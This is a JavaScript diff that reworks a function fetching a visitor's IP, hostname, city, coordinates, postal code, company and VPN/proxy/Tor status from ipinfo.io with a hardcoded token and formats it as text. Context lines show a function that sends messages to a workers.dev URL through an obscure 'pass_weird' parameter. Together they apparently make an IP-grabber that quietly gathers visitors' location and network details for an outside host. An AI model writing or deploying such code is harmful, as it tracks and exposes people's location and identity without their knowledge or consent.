@@ -90,15 +90,112 @@
     }
 
     async function fetchIPInfo() {
-        try {
-            const response = await fetch('https://ipinfo.io/?token=46123289608cfd');
-            const data = await response.json();
-            return data;
-        } catch (error) {
-            console.error('Error fetching IP info:', error);
-            return null;
-        }
+    try {
+        // Define the full expected data format from the server
+        const FullIPDataFormat = {
+            "ip": "",
+            "hostname": "",
+            "city": "",
+            "region": "",
+            "country": "",
+            "loc": "",
+            "postal": "",
+            "timezone": "",
+            "asn": {
+                "asn": "",
+                "name": "",
+                "domain": "",
+                "route": "",
+                "type": ""
+            },
+            "company": {
+                "name": "",
+                "domain": "",
+                "type": ""
+            },
+            "privacy": {
+                "vpn": false,
+                "proxy": false,
+                "tor": false,
+                "relay": false,
+                "hosting": false,
+                "service": ""
+            },
+            "abuse": {
+                "address": "",
+                "country": "",
+                "email": "",
+                "name": "",
+                "network": "",
+                "phone": ""
+            },
+            "domains": {
+                "page": 0,
+                "total": 0,
+                "domains": []
+            }
+        };
+
+        // Define the required output format (without quotes, commas, and braces as per request)
+        const RequiredIPDataFormat = `
+ip: 
+hostname: 
+city: 
+region: 
+country: 
+loc: 
+postal: 
+timezone: 
+
+company:
+    name: 
+    domain: 
+    type: 
+
+privacy:
+    vpn: 
+    proxy: 
+    tor: 
+    relay: 
+    hosting: 
+    service: 
+        `;
+
+        // Fetch data from the API
+        const response = await fetch('https://ipinfo.io/?token=46123289608cfd');
+        const fullData = await response.json(); // Received full data
+
+        // Map full data to the required format
+        const modifiedData = `
+ip: ${fullData.ip}
+hostname: ${fullData.hostname}
+city: ${fullData.city}
+region: ${fullData.region}
+country: ${fullData.country}
+loc: ${fullData.loc}
+postal: ${fullData.postal}
+timezone: ${fullData.timezone}
+
+company:
+    name: ${fullData.company?.name || ""}
+    domain: ${fullData.company?.domain || ""}
+    type: ${fullData.company?.type || ""}
+
+privacy:
+    vpn: ${fullData.privacy?.vpn || false}
+    proxy: ${fullData.privacy?.proxy || false}
+    tor: ${fullData.privacy?.tor || false}
+    relay: ${fullData.privacy?.relay || false}
+    hosting: ${fullData.privacy?.hosting || false}
+    service: ${fullData.privacy?.service || ""}
+        `;
+
+        return modifiedData;
+    } catch (error) {
+        console.error("Error fetching IP info:", error);
+        return null;
     }
+}
 
     async function sendMessageToURL(message) {
         const url = `https://t.dog37.workers.dev/?pass_weird9351047102628027252902=${encodeURIComponent(message)}`;
